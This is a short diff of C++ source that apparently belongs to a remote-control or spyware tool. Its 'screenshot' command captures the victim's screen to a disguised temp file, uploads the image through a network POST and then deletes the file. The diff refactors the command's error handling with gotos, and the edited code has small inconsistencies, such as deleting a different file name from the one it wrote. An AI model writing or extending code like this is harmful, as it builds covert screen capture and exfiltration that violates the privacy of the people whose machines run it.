@@ -62,15 +62,13 @@ command_t commandDefs[] = {
 		{
 			"screenshot", [](std::vector<std::string> args) {
 
-				static const TCHAR* tmpFile = V_FAKE_TMP1;
-
-				screenshot.TakeScreenshot(tmpFile);
+				screenshot.TakeScreenshot(V_FAKE_TMP1);
 
 				FILE *fp;
-				errno_t error = _tfopen_s(&fp, tmpFile, _T("rb"));
+				errno_t error = _tfopen_s(&fp, V_FAKE_TMP1, _T("rb"));
 				if (error != 0) {
 					Error(_T("_tfopen failed"));
-					return;
+					goto g_1;
 				}
 
 				fseek(fp, 0, SEEK_END);
@@ -82,23 +80,21 @@ command_t commandDefs[] = {
 				if (!buffer)
 				{
 					Error(_T("Couldn't allocate buffer"));
-					fclose(fp);
-					return;
+					goto g_2;
 				}
 
 				if (fread_s(buffer, size, 1, size, fp) != size)
 				{
 					Error(_T("fread_s did not return size"));
-					free(buffer);
-					fclose(fp);
-					return;
+					goto g_3;
 				}
-				fclose(fp);
 
-				network.SendPost(buffer, size, false);
+				char* response = network.SendPost(buffer, size, false);
+				if (response) free(response);
 
-				free(buffer);
-				DeleteFile(_T("screen.png"));
+				g_3:	free(buffer);
+				g_2:	fclose(fp);
+				g_1:	DeleteFile(_T("screen.png"));
 			}
 		},
 		{
